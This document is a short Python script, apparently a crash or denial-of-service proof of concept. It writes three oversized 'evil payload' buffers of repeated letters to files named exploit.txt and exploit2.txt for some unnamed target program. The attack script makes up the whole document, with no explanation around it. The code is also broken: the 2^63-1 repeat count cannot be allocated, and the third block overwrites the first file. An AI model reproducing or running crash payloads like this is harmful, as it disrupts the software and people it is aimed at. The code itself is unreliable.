buffer = "A\n" * 9223372036854775807
buffer2 = "B\n" * 9223372036854775807
buffer3 = "C\n" * 9223372036854775807


payload = buffer
payload2 = buffer2
payload3 = buffer3

try:
    f = open("exploit.txt","w")
    print("[+] Creating %s bytes evil payload.." %len(payload))
    f.write(payload)
    f.close()
    print("[+] File created!")
except:
    print("File cannot be created")


try:
    f = open("exploit2.txt","w")
    print("[+] Creating %s bytes evil payload.." %len(payload2))
    f.write(payload2)
    f.close()
    print("[+] File created!")
except:
    print("File cannot be created")


try:
    f = open("exploit.txt","w")
    print("[+] Creating %s bytes evil payload.." %len(payload3))
    f.write(payload3)
    f.close()
    print("[+] File created!")
except:
    print("File cannot be created")